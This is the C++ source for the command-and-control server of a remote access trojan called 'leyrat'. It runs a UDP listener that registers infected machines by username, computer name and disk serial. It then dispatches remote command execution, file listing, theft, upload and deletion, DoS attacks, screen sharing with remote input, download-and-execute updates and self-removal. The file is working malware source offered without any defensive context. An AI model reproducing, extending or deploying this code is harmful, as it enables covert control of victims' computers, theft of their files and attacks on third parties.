#include "leyrat.h"
#include "leybuf.h"
#include "leynet.h"

#include <Windows.h>
#include <stdlib.h>
#include <cstdio>

leynet_udp net;
leyrat rat;

#define NETBUFFER_SIZE 0xFFFF

short serverport = 27065;

int recvfromthink()
{

	char netrecbuffer[NETBUFFER_SIZE];
	memset(netrecbuffer, 0, NETBUFFER_SIZE);

	int msgsize = 0;

	char charip[25];
	net.Receive(&msgsize, netrecbuffer, NETBUFFER_SIZE, charip);

	if (!msgsize)
		return 0;

	leybuf buf(netrecbuffer, msgsize);

	if (buf.ReadChar() != '\xDB' || buf.ReadChar() != '\xDB')
	{
		printf("unknown pkg from:%s!\n", charip);
		printf("unknown pkg %i:: %s\n", msgsize, netrecbuffer);


		return 0;
	}

	char type = buf.ReadChar();


	if (!rat.IsOnlineClient(charip))
	{
		if (type == 'a')//acknowledge server
		{
			
			int version = buf.ReadInt32();
			unsigned long diskserial = buf.ReadInt32();

			char language[100];
			char username[260];
			char computername[25];

			buf.ReadString(language, 100);
			buf.ReadString(username, 260);
			buf.ReadString(computername, 25);

			rat.ClientAdd(charip, version, diskserial, language, username, computername);
			rat.Callback_AckServer(charip, version, diskserial, language, username, computername);

			return 0;
		}


		printf("pkg from !client:%s!\n", charip);
		printf("unknown pkg %i:: %s\n", msgsize, netrecbuffer);
		return 0;
	}


	if (type == 'b')//run cmd
	{
		rat.Callback_RunCmd(charip);
		return 0;
	}

	if (type == 'c')//list files
	{
		int numfiles = 0;
		char **files = new char*[0xFFFF];

		while (buf.GetNumBytesLeft() > 0)
		{
			char *file = new char[260];
			memset(file, 0, 250);

			buf.ReadString(file, 255);

			files[numfiles] = file;
			numfiles++;
		}

		rat.Callback_FileList(charip, files, numfiles);
		return 0;
	}

	if (type == 'd')//(download || delete) file, 0 length deletes file
	{
		char is_delete = buf.ReadChar() == '2';

		if (is_delete)
			rat.Callback_FileDelete(charip);
		else
			rat.Callback_FileDownload(charip);

	}

	if (type == 'e')//upload file
	{

		bool error = false;

		if (buf.GetNumBytesLeft() == 0)
		{
			error = true;
			return 0;
		}


		char *filename = new char[260];
		buf.ReadString(filename, 256);


		int len = buf.GetNumBytesLeft();

		char*bytes = new char[len];
		buf.ReadBytes(bytes, len);

		rat.Callback_FileUpload(charip, filename, bytes, len);


	}

	if (type == 'g')//dos
	{
		rat.Callback_Dos(charip);
	}

	if (type == 'j')//screenshare
	{
		rat.Callback_Screenshare(charip);
	}

	if (type == 'l')//screenshare input
	{
		rat.Callback_ScreenshareInput(charip);
	}

	if (type == '1')//update/download&execute
	{
		rat.Callback_HTTPDownload(charip);
	}

	if (type == '2')//suicide
	{
		rat.Callback_Suicide(charip);

	}

	return 0;
}


int main()
{
	/*leynet_tcp datcp;
	datcp.Start();
	datcp.OpenConnection("i.imgur.com", 80);
	datcp.HTTPGet("/3xlqDNL.png");

	int msgsize = 0;
	char* buffer= new char[5000];

	datcp.Receive(&msgsize, buffer, 5000, true);
	datcp.SetNonBlocking(true);*/

	net.Start();
	net.OpenSocket(serverport);
	net.SetNonBlocking(true);

	while (true)
	{
		recvfromthink();
		Sleep(1);
	}

	return 0;
}